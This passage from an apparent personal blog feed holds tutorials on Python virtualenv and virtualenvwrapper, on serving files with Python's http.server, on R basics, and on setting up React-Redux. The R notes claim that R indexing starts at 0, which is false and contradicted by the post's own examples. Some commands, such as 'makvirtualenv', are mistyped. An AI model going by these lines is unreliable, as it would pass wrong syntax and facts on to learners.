<h2 id="2-Install-virtualenv"><a href="#2-Install-virtualenv" class="headerlink" title="2. Install virtualenv"></a>2. Install virtualenv</h2><p><em>PS: My laptop is MacBook, so the following procedure is based on the macbook terminal.</em></p>
<ol>
<li><p>Before installing, you should make sure you’ve already installed pip, and then use pip to install env.  </p>
<blockquote>
<p>pip3 install virtualenv</p>
</blockquote>
</li>
<li><p>Check if the installation is successful  </p>
<blockquote>
<p>virtualenv –version</p>
</blockquote>
</li>
<li><p>Create the big virtual environment  </p>
<p>Firstly, you should ‘cd’ to the directory where you wanna create VE(virtual environment)</p>
<blockquote>
<p> virtualenv envname #Here you should give your virtual environment name</p>
</blockquote>
<p>The environment will also install Python setuptools, pip, wheel automatically</p>
</li>
<li><p>Activate your environment</p>
<blockquote>
<p>Source bigenvname/bin/activate</p>
</blockquote>
</li>
<li><p>Extra procedure</p>
<p>For me, I often use terminal to start the editor, so when you activate the environment, Use ‘cd’ to the directory where you wanna store your code file. And then start jupyter notebook.</p>
<blockquote>
<p>jupyter notebook</p>
</blockquote>
<p>So now you can code in the envname virtual environment.</p>
</li>
</ol>
<hr>
<h2 id="3-Install-virtualenvwrapper"><a href="#3-Install-virtualenvwrapper" class="headerlink" title="3. Install virtualenvwrapper"></a>3. Install virtualenvwrapper</h2><p>*Note: Sometimes, we may create more than one VE, and we’d like to swap between the different VE. Hence, we need the command ‘workon’ which is belong to the package virtualenvwrapper. </p>
<ol>
<li><p>Install VEW. </p>
<blockquote>
<p>pip3 install virtualenvwrapper</p>
</blockquote>
</li>
<li><p>Configure VEW. </p>
<blockquote>
<p>export WORKON_HOME=’your sub-VE address’</p>
<p>source /usr/local/bin/virtualenvwrapper.sh  // execute the command package</p>
</blockquote>
<p>But what if your address is not the above default address, how could you find it? I faced the same problem before. We can try to uninstall the package ‘virtualenvwrapper’ and it will prompt us all the files address we would delete.</p>
<p>![截屏2021-02-20 13.24.51](/Users/arieskoo/Library/Application Support/typora-user-images/截屏2021-02-20 13.24.51.png)</p>
</li>
<li><p>After configuring all the environment parameters, we s=also need to execute source command to make it work. </p>
<blockquote>
<p>source ~/.bash_profile</p>
</blockquote>
</li>
</ol>
<hr>
<h2 id="4-Use-VEW-to-create-sub-environment"><a href="#4-Use-VEW-to-create-sub-environment" class="headerlink" title="4.  Use VEW to create sub-environment"></a>4.  Use VEW to create sub-environment</h2><ol>
<li><p>create sub-env</p>
<blockquote>
<p>makvirtualenv env01(envname)</p>
</blockquote>
<p>The default address is under the previous export WORKON_HOME=’your sub-VE address’.</p>
</li>
<li><p>Query the list of VE</p>
<blockquote>
<p>lsvirtualenv -b</p>
</blockquote>
</li>
<li><p>query the python pakcages</p>
<blockquote>
<p>lssitepackages</p>
</blockquote>
</li>
<li><p>exchange the sub-VE</p>
<blockquote>
<p>workon envname</p>
</blockquote>
</li>
<li><p>Remove sub-VE</p>
<blockquote>
<p>rmvirtualenv envname</p>
</blockquote>
</li>
<li><p>Install python packages in the sub-VE</p>
<blockquote>
<p>pip install packagename</p>
</blockquote>
</li>
<li><p>exit the sub-VE</p>
<blockquote>
<p>deactivate</p>
</blockquote>
</li>
<li><p>How to start VE every time start the PC</p>
<p>Since you totally exit the VE, you need to reactivate the big VE every time you wanna reenter it.</p>
<blockquote>
<p>cd big VE address</p>
<p>source bigenvname/bin/activate</p>
<p>workon sub-VEname</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>virtualenv</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Python设置本地测试服务器</title>
    <url>/en/2021/09/16/Python-localServer/</url>
    <content><![CDATA[<p><strong>关于使用Python搭建简易本地服务器指南，可用于异步测试等。</strong></p>
<a id="more"></a>

<h2 id="测试本地文件的问题"><a href="#测试本地文件的问题" class="headerlink" title="测试本地文件的问题"></a>测试本地文件的问题</h2><ul>
<li><strong>它们具有异步请求功能</strong>。如果您只是从本地文件运行示例，某些浏览器（包括 Chrome）将不会运行异步请求。这是因为安全限制。</li>
<li><strong>它们具有服务器端语言</strong>。服务器端语言（例如 PHP 或 Python）需要一个特殊的服务器来解释代码并交付结果。</li>
</ul>
<h2 id="利用Python建立简单本地HTTP服务器"><a href="#利用Python建立简单本地HTTP服务器" class="headerlink" title="利用Python建立简单本地HTTP服务器"></a>利用Python建立简单本地HTTP服务器</h2><ul>
<li><p>安装Python</p>
</li>
<li><p>运行命令行（我是mac），输入以下命令检查是否安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python --version</span><br></pre></td></tr></table></figure></li>
<li><p>cd到目标文件目录</p>
</li>
<li><p>启动服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure></li>
<li><p>默认端口号是8000，通过localhost:8000来访问此服务器</p>
</li>
<li><p><strong>PS:</strong> 切换端口号使用如下命令（以7800端口号为例）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7800</span><br></pre></td></tr></table></figure></li>
</ul>
<p><em><strong>最后， Python的http.server只是静态文件服务器，他无法运行python、php、javascript等语言的代码，所以要在本地运行服务器端语言代码，可以使用Python Web框架，比如Django等</strong></em></p>
]]></content>
      <categories>
        <category>Frontend/前端</category>
      </categories>
      <tags>
        <tag>Server</tag>
      </tags>
  </entry>
  <entry>
    <title>R-NoteBook</title>
    <url>/en/2021/02/16/Rnotebook/</url>
    <content><![CDATA[<h1 id="R-Lab1-Note"><a href="#R-Lab1-Note" class="headerlink" title="R Lab1 Note"></a>R Lab1 Note</h1><a id="more"></a>

<h3 id="1-Basic-Operations"><a href="#1-Basic-Operations" class="headerlink" title="1   Basic Operations"></a>1   Basic Operations</h3><h4 id="Arithmetic-Operations"><a href="#Arithmetic-Operations" class="headerlink" title="Arithmetic Operations"></a>Arithmetic Operations</h4><ol>
<li><p>Define variable</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">x &lt;- 10</span><br><span class="line">y &lt;- 20</span><br></pre></td></tr></table></figure></li>
<li><p>Calculation operation</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">x + y</span><br><span class="line">x * y</span><br><span class="line">x / y</span><br><span class="line">x ^ y</span><br><span class="line">x %% y <span class="comment"># the module of x/y</span></span><br><span class="line"><span class="built_in">log</span>(x,y) <span class="comment"># The log to the base y of x</span></span><br><span class="line"><span class="built_in">sqrt</span>(x) <span class="comment"># the square root of x</span></span><br><span class="line">mean(<span class="built_in">c</span>(x,y)) <span class="comment"># the mean between x and y, but remember to use the vector in the mean function!!!</span></span><br><span class="line"><span class="built_in">trunc</span>(x) <span class="comment"># discard the decimals of x</span></span><br><span class="line"><span class="built_in">round</span>(x,y) <span class="comment"># generally use rounding and keep y decimal places, but will be affected by floating point numbers</span></span><br></pre></td></tr></table></figure>
<h4 id="Logical-Operations"><a href="#Logical-Operations" class="headerlink" title="Logical Operations"></a>Logical Operations</h4></li>
</ol>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">x &gt;= y -<span class="number">3</span> <span class="comment"># arithmetic operations take priority</span></span><br><span class="line">x &lt;= y</span><br><span class="line">x == y</span><br><span class="line">x != y</span><br><span class="line">w &lt;- <span class="literal">TRUE</span></span><br><span class="line">z &lt;- <span class="literal">FALSE</span></span><br><span class="line">!w <span class="comment"># not</span></span><br><span class="line">w | z <span class="comment"># or</span></span><br><span class="line">w &amp; z <span class="comment"># and</span></span><br><span class="line">isTRUE(operation) <span class="comment"># identify if the result is TRUE</span></span><br><span class="line">identical(x,y) <span class="comment"># only when the two objects are the same, it will return TRUE</span></span><br><span class="line">xor(operation1,operation2) <span class="comment"># only when one is TRUE and the other is FALSE, it will return TRUE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># which, any, all, three of them all use logical vector as its argument e.g. vector &gt; 10</span></span><br><span class="line">which(vector &gt; <span class="number">10</span>) <span class="comment"># It returns the index of all the TRUE elements in the vector.</span></span><br><span class="line"><span class="built_in">any</span>(vector &gt; <span class="number">10</span>) <span class="comment"># when one or some elements is TRUE, it will return TRUE</span></span><br><span class="line"><span class="built_in">all</span>(vector &gt; <span class="number">10</span>) <span class="comment"># when all the elements are TRUE, it will return TRUE</span></span><br></pre></td></tr></table></figure>


<hr>
<h3 id="2-Some-additional-functions"><a href="#2-Some-additional-functions" class="headerlink" title="2   Some additional functions"></a>2   Some additional functions</h3><blockquote>
<p><strong>For example</strong></p>
<p><strong>schoolmath</strong></p>
</blockquote>
<p><strong>Here are all its functions</strong></p>
<ol>
<li><p>cancel.fraction(numerator, denominator)</p>
<p><em>It cancels a fraction to its simplest form</em></p>
</li>
<li><p>decimal2fraction(decimal, period=0)</p>
<p><em>It converts a decimal number into a fraction and the argument period means the repeating ending number if it has.</em></p>
<p><em>E.g. 12.123444444…, so it will be decimal2fraction(12.123,4)</em></p>
</li>
<li><p>gcd(x, y)</p>
<p><em>It gives the greatest common divisor of two numbers, x and y</em></p>
</li>
<li><p>scm(x, y)</p>
<p><em>It gives the smallest common multiple of two numbers, x and y</em></p>
</li>
<li><p>is. type function</p>
<p><em>x can be a <strong>number</strong> or a <strong>vector</strong> and it returns <strong>TRUE/FALSE</strong></em></p>
<ul>
<li>is.decimal(x) </li>
<li>is.whole(x)</li>
<li>is.even(x)</li>
<li>Is.odd(x)</li>
<li>is.negative(x)</li>
<li>is.positive(x)</li>
<li>is.real.positive(x)      <em>zero is included as a positive number</em></li>
<li>is.prim(x)</li>
</ul>
</li>
<li><p>prime.factor(x)</p>
<p><em>It gives a <strong>vector</strong> of all the prime-factors (except 1) of a number x</em></p>
</li>
<li><p>primes(start, end)</p>
<p><em>It gives a <strong>vector</strong> of prime-numbers between start number and end number, if it’s not given start and end, it will give all the prim-numbers</em></p>
</li>
<li><p>primlist</p>
<p><em>It gives a <strong>vector</strong> of prime-numbers between 1 and 9999999</em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">primlist[<span class="number">1</span>:<span class="number">10</span>]</span><br></pre></td></tr></table></figure>

<p>#[1]  1  2  3  5  7 11 13 17 19 23</p>
</li>
</ol>
<h3 id="3-Some-Data-Structures"><a href="#3-Some-Data-Structures" class="headerlink" title="3    Some Data Structures"></a>3    Some Data Structures</h3><blockquote>
<p><em><strong>There are vectors, sequences, matrices, lists, arrays and data frames.</strong></em></p>
</blockquote>
<h4 id="3-1-Vectors-and-Sequences"><a href="#3-1-Vectors-and-Sequences" class="headerlink" title="3-1  Vectors and Sequences"></a>3-1  Vectors and Sequences</h4><h5 id="How-to-define-vectors-and-sequences"><a href="#How-to-define-vectors-and-sequences" class="headerlink" title="How to define vectors and sequences"></a>How to define vectors and sequences</h5><ol>
<li><p>Vectors</p>
<p>Use the c() function, which stands for ‘concatenate’:  </p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a &lt;- <span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>If you want to create a vector with the same repeated value, use rep(x, times=) or rep(x, each=):  </p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rep</span>(<span class="number">1</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>#[1]  1 1 1</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rep</span>(<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="number">2</span>)</span><br><span class="line"><span class="built_in">rep</span>(<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),times=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>#[1]  1 2 3 1 2 3</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rep</span>(<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),each=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>#[1]  1 1 2 2 3 3</p>
</li>
<li><p>Sequences</p>
<p>Use the : operator or the seq(from=, to=, by=) function</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">b &lt;- 1:<span class="number">100</span></span><br><span class="line">b1 &lt;- seq(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">b2 &lt;- seq(from=<span class="number">1</span>, to=<span class="number">100</span>)</span><br><span class="line">b3 &lt;- seq(from=<span class="number">1</span>, to=<span class="number">100</span>, by=<span class="number">1</span>)</span><br><span class="line">b4 &lt;- seq(to=<span class="number">100</span>, from=<span class="number">1</span>, by=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>#all the 5 outputs are same</p>
</li>
</ol>
<h5 id="Some-arithmetic-and-logical-operations"><a href="#Some-arithmetic-and-logical-operations" class="headerlink" title="Some arithmetic and logical operations"></a>Some arithmetic and logical operations</h5><ol>
<li><p>Select certain element using index</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>#[1]    1</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>#[1]    2 3</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a[<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>)]</span><br></pre></td></tr></table></figure>
<p>#[1]    1 2</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a[<span class="number">1</span>:<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<p>#[1]    1 2 3</p>
<p>For index selection, sequences are the same as vectors.</p>
<p><em><strong>NOTICE: In R, the first index is 0 which is totally different from most of other script languages!!!</strong></em></p>
</li>
<li><p>Logical operations application</p>
<p><strong>&gt;  &lt;  ==  !=</strong></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a&gt;<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>#[1]    FALSE FALSE TRUE</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a[a&gt;<span class="number">2</span>]</span><br></pre></td></tr></table></figure>
<p>#[1]    3</p>
<p>For logical operations, sequences are the same as vectors.</p>
</li>
<li><p>Arithmetic operations</p>
<p> <em>In most cases, these operations are performed</em> <em><strong>element by element</strong></em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a + <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>#[1]    4 5 6</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a - -<span class="number">3</span>:-<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>#[1]    4 4 4</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">a == <span class="number">5</span>:<span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>#[1]    FALSE FALSE FALSE</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sqrt</span>(a)</span><br></pre></td></tr></table></figure>
<p>#[1]    1.000000 1.414214 1.732051</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">mean(a)</span><br></pre></td></tr></table></figure>
<p>#[1]    2</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">sd(a) <span class="comment"># standard deviation</span></span><br></pre></td></tr></table></figure>
<p>#[1]    1</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">median(a) <span class="comment"># median</span></span><br></pre></td></tr></table></figure>
<p>#[1]    2</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">summary(a) <span class="comment"># min max mean med quartile infromation</span></span><br></pre></td></tr></table></figure>
<p>#Min. 1st Qu.  Median    Mean  3rd Qu.    Max.</p>
<p>   1.0       1.5          2.0            2.0       2.5         3.0 </p>
</li>
</ol>
<h4 id="3-2-Matrices"><a href="#3-2-Matrices" class="headerlink" title="3-2  Matrices"></a>3-2  Matrices</h4><h5 id="1-How-to-define-matrices"><a href="#1-How-to-define-matrices" class="headerlink" title="1. How to define matrices"></a>1. How to define matrices</h5><ul>
<li>Use <strong>matrix()</strong> function, </li>
</ul>
<p>matrix(vector, nrow=r, ncol=c, byrow=FALSE, dimnames=list(char_vector_rownames, char_vector_colnames))</p>
<p><em>The default is the matrix is filled by columns</em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">rnames &lt;- <span class="built_in">c</span>(<span class="string">&quot;1st row&quot;</span>, <span class="string">&quot;2nd row&quot;</span>)</span><br><span class="line">cnames &lt;- <span class="built_in">c</span>(<span class="string">&quot;1st col&quot;</span>, <span class="string">&quot;2nd col&quot;</span>)</span><br><span class="line">A &lt;- matrix(<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>),nrow=<span class="number">2</span>,byrow=<span class="literal">TRUE</span>, <span class="built_in">dimnames</span>=<span class="built_in">list</span>(rnames, cnames))</span><br></pre></td></tr></table></figure>
<ul>
<li><p>Use bind function, <strong>rbind()     cbind()</strong></p>
<p><em>bind by row: rbind(v1, v2, …)</em></p>
<p><em>bind by col: bind(v1, v2, …)</em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">A &lt;- rbind(<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>),<span class="built_in">c</span>(<span class="number">3</span>,<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<p>The two outputs are the same.</p>
</li>
</ul>
<h5 id="2-How-to-use-index"><a href="#2-How-to-use-index" class="headerlink" title="2. How to use index"></a>2. How to use index</h5><p><em>Generally, matrices are 2 dimensions, so [rownumber, colnumber] can locate the certain element in the matrix.</em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">A[<span class="number">1</span>,<span class="number">2</span>] <span class="comment"># the element at the 1st row and 2nd col</span></span><br></pre></td></tr></table></figure>
<p><em>If we’d like to get certain whole row or column, we should leave the other dimension blank.</em></p>
<p>e.g.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">A[,<span class="number">2</span>] <span class="comment"># 2nd column</span></span><br><span class="line">A[<span class="number">1</span>,] <span class="comment"># 1st row</span></span><br><span class="line">A[<span class="number">1</span>:<span class="number">2</span>,<span class="number">1</span>] <span class="comment"># row 1,2 of column 1</span></span><br><span class="line">A[<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>),<span class="built_in">c</span>(<span class="number">1</span>,<span class="number">2</span>)] <span class="comment">#row 1,2 of column 1,2</span></span><br><span class="line">A[-<span class="number">1</span>,] <span class="comment"># drop 1st row and show other rows</span></span><br><span class="line">A[A%%2==<span class="number">0</span>] <span class="comment"># all the even numbers</span></span><br></pre></td></tr></table></figure>
<h5 id="3-Arithmetic-logical-and-statistical-operations"><a href="#3-Arithmetic-logical-and-statistical-operations" class="headerlink" title="3. Arithmetic, logical and statistical operations"></a>3. Arithmetic, logical and statistical operations</h5><ul>
<li><p><em>Mostly, the operations are performed element by element</em></p>
<p><strong>+  -  *  /  ^</strong></p>
</li>
<li><p>arithmetic matrix operation</p>
<p>e.g. <strong>%*%</strong> is the arithmetic matrix multiplication</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">A %*% B</span><br></pre></td></tr></table></figure></li>
<li><p>statistical operation</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sqrt</span>(A)</span><br><span class="line">mean(A) <span class="comment"># mean of all values</span></span><br><span class="line">rowMeans(A) <span class="comment"># mean by row</span></span><br><span class="line">colMeans(A) <span class="comment"># mean by column</span></span><br><span class="line">sd(A)</span><br><span class="line"><span class="built_in">length</span>(A) <span class="comment"># the number of all elements</span></span><br><span class="line">ncol(A) <span class="comment"># the number of columns</span></span><br><span class="line">nrow(A) <span class="comment"># the number of rows</span></span><br><span class="line">rowSums(A) <span class="comment"># the sum of each row</span></span><br><span class="line">colSums(A) <span class="comment"># the sum of each column</span></span><br></pre></td></tr></table></figure></li>
<li><p>logical operation</p>
<p><strong>element by element</strong></p>
<p><em>==    !=    &gt;    &lt;</em></p>
</li>
</ul>
<h4 id="3-3-Arrays"><a href="#3-3-Arrays" class="headerlink" title="3-3  Arrays"></a>3-3  Arrays</h4><h5 id="1-How-to-define"><a href="#1-How-to-define" class="headerlink" title="1. How to define"></a>1. How to define</h5><p><em>Arrays are similar to matrices but can have over 2 dimensions</em></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">arra &lt;- array(<span class="number">1</span>:<span class="number">8</span>,<span class="built_in">dim</span>=<span class="built_in">c</span>(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>), <span class="built_in">dimnames</span>=<span class="built_in">list</span>(<span class="built_in">c</span>(<span class="string">&#x27;x1&#x27;</span>,<span class="string">&#x27;x2&#x27;</span>),<span class="built_in">c</span>(<span class="string">&#x27;y1&#x27;</span>,<span class="string">&#x27;y2&#x27;</span>),<span class="built_in">c</span>(<span class="string">&#x27;z1&#x27;</span>,<span class="string">&#x27;z2&#x27;</span>))) <span class="comment"># 3D array which is the 2*2*2 structure</span></span><br></pre></td></tr></table></figure>
<h5 id="2-How-to-use-index-1"><a href="#2-How-to-use-index-1" class="headerlink" title="2. How to use index"></a>2. How to use index</h5><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">arra[,,<span class="number">1</span>]</span><br><span class="line">arra[,,<span class="string">&#x27;z1&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>The two outputs are both the 1st layer of 3rd axis.</p>
<h5 id="3-Operations"><a href="#3-Operations" class="headerlink" title="3. Operations"></a>3. Operations</h5><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">arra1 &lt;- array(sample.int(<span class="number">100</span>,<span class="number">27</span>), <span class="built_in">dim</span>=<span class="built_in">c</span>(<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>)) <span class="comment"># sample functiongenerates 27 random numbers between 0 and 100</span></span><br></pre></td></tr></table></figure>
<p><em>Most of them are the same as matrices, except statistical functions e.g. colMeans(), rowMeans() and rowSums(), colSums()</em></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">rowMeans(arra1)</span><br></pre></td></tr></table></figure>
<p>The output will be three numbers, of which one is <strong>mean of arra1[1/2/3,,]</strong></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">colMeans(arra1)</span><br></pre></td></tr></table></figure>
<p>The output will be a 3*3 matrix, where each element is <strong>the mean of arra1[,1/2/3,1/2/3]</strong></p>
<h3 id="4-Simple-Plots"><a href="#4-Simple-Plots" class="headerlink" title="4  Simple Plots"></a>4  Simple Plots</h3><h4 id="How-to-define"><a href="#How-to-define" class="headerlink" title="How to define"></a>How to define</h4><p><em>Use plot() function</em></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">diagram1 &lt;- plot(x, y, col=<span class="string">&quot;colorname&quot;</span>, type=<span class="string">&quot;the type of plot e.g. p/l/c/o/s/h/n&quot;</span>, pch=<span class="string">&quot;the shape of dot e.g. 0:25&quot;</span>, main=<span class="string">&quot;title&quot;</span>, xlab=<span class="string">&quot;X Label&quot;</span>, ylab=<span class="string">&quot;Y Label&quot;</span>, bg=<span class="string">&quot;dot color only when pch=21:25&quot;</span>, ...)</span><br></pre></td></tr></table></figure>


<p>Finally, there’re still some knowledge I haven’t mentioned, such as data frame and some more complicated applications of all the structures and plot() function. They will be discussed in the following notes later.</p>
]]></content>
      <categories>
        <category>R</category>
      </categories>
      <tags>
        <tag>R</tag>
      </tags>
  </entry>
  <entry>
    <title>Redux入门操作详解</title>
    <url>/en/2021/11/28/Redux%E5%85%A5%E9%97%A8%E6%93%8D%E4%BD%9C%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p><strong>Redux 是 JavaScript 状态容器，提供可预测化的状态管理。</strong>随着 JavaScript 单页应用开发日趋复杂，<strong>JavaScript 需要管理比任何时候都要多的 state （状态）</strong>。 这些 state 可能包括<strong>服务器响应、缓存数据、本地生成尚未持久化到服务器的数据</strong>，也包括<strong>UI 状态，如激活的路由，被选中的标签，是否显示加载动效或者分页器</strong>等等。<strong>本次主要讲解当前针对react框架的redux，即REACT-REDUX。</strong></p>
<a id="more"></a>

<h1 id="React-Redux"><a href="#React-Redux" class="headerlink" title="React-Redux"></a>React-Redux</h1><p><strong>首先，react-redux与redux的核心理念一致，只是一些API的使用上存在差异，react-redux使得在react中使用redux更为简便。</strong></p>
<h2 id="Redux的三大原则——Three-Principles"><a href="#Redux的三大原则——Three-Principles" class="headerlink" title="Redux的三大原则——Three Principles"></a>Redux的三大原则——Three Principles</h2><h3 id="单一数据源"><a href="#单一数据源" class="headerlink" title="单一数据源"></a>单一数据源</h3><p>整个应用的<code>state</code>被存储在一棵object tree上，并且这个object tree只存在于<code>store</code>，且<code>store</code>是唯一的，仅此一个。</p>
<h3 id="State只读"><a href="#State只读" class="headerlink" title="State只读"></a>State只读</h3><p>唯一改变state的方法是触发<strong>action</strong>，action是一个用于描述已发生事件的对象，其形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code></p>
<h3 id="使用纯函数来执行修改"><a href="#使用纯函数来执行修改" class="headerlink" title="使用纯函数来执行修改"></a>使用纯函数来执行修改</h3><p><strong>为了描述action如何改变state tree，需要编写reducers。</strong></p>
<p>Reducer只是一些纯函数，它接收先前的 state 和 action，并返回新的 state。</p>
<h2 id="React-Redux实际操作步骤"><a href="#React-Redux实际操作步骤" class="headerlink" title="React-Redux实际操作步骤"></a>React-Redux实际操作步骤</h2><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>在src下新建名为<code>redux</code>的文件，并创建好4个common JS文件，分别为<code>store.js</code>, <code>reducer.js</code>, <code>action.js</code>以及<code>constant.js</code>。其中<code>constant.js</code>用于存储常量，其余三个代表redux的三个核心。</p>
<p>注：如果不只一个<code>action/reducer</code>，可以分别创建action和reducer的文件夹。</p>
<p>在<code>index.js</code>中引入<code>store.js</code>，并从<code>react-redux</code>中引入<code>Provider</code>，<code>Provider</code>组件用于给<code>App</code>下的每个需要用到redux的组件传递<code>store</code>。实例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">&#x27;react-dom&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./redux/store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;Provider&#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    <span class="comment">//为所有组件提供store</span></span><br><span class="line">    &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">        &lt;App /&gt;</span><br><span class="line">    &lt;/Provider&gt;,</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;root&#x27;</span>));</span><br></pre></td></tr></table></figure>


<h3 id="步骤二——编写store"><a href="#步骤二——编写store" class="headerlink" title="步骤二——编写store"></a>步骤二——编写store</h3><p>在store文件中引入能创建<code>store</code>实例的<code>creatStore</code>、能修改状态的<code>reducer</code>和能执行异步的<code>thunk</code>和中间件<code>applyMiddleware</code>（如果需要）。</p>
<p>注：<strong>对于多个状态需要维护的情况，从<code>redux</code>中引入<code>combineReducers</code>方法，该方法可以通过对象<code>&#123;&#125;</code>的键值对<code>key:value</code>形式，维护任意多个状态（即reducer）。</strong></p>
<p>实例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createStore, applyMiddleware, combineReducers&#125; <span class="keyword">from</span> <span class="string">&#x27;redux&#x27;</span></span><br><span class="line"><span class="keyword">import</span> countReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/count&#x27;</span></span><br><span class="line"><span class="keyword">import</span> personReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/person&#x27;</span></span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">&#x27;redux-thunk&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> allReducers = combineReducers(&#123;<span class="attr">count</span>: countReducer, <span class="attr">people</span>: personReducer&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = createStore(allReducers, applyMiddleware(thunk))</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure>
<h3 id="步骤三——编写action"><a href="#步骤三——编写action" class="headerlink" title="步骤三——编写action"></a>步骤三——编写action</h3><p>引入store文件，和常量文件constant（如果有）。编写action函数，其会返回一个action对象，形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code>。</p>
<p>实例如下：</p>
